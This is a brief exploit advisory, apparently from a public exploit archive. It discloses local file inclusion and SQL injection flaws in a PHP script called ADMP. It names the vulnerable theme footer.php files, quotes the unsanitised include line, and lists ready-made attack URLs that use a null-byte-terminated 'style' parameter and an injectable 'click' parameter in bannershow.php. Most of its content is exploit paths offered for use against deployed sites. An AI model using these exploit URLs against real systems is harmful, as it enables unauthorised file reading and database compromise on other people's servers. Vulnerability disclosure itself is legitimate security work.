@@ -1,0 +1,34 @@
+#########################local file include / sql injection#################
+Author: ItSecTeam
+
+download from:http://geekhelps.net/download.php
+
+script:ADMP
+
+remote:yes
+
+dork::D
+*********************lfi*******************
+vul1:/path/themes/colorvoid/footer.php
+include("./themes/$style/info.php"); ?> line 3
+
+vuls:themes/default-green/footer.php
+themes/default-orange/footer.php
+themes/default/footer.php
+
+include("./themes/$style/info.php"); ?> line 4
+--------------------------------------------
+
+xpl lfi:/path/themes/colorvoid/footer.php?style=[lfi]%00
+xpl lfi:/path/themes/default-green/footer.php ?style=[lfi]%00
+
+xpl lfi:/path/themes/default-orange/footer.php?style=[lfi]%00
+xpl lfi:/path/themes/default/footer.php?style=[lfi]%00
+
+xpl sql:/path/bannershow.php?click=' sql injection code
+
+########################
+
+discovered by ahmadbady
+
+########################
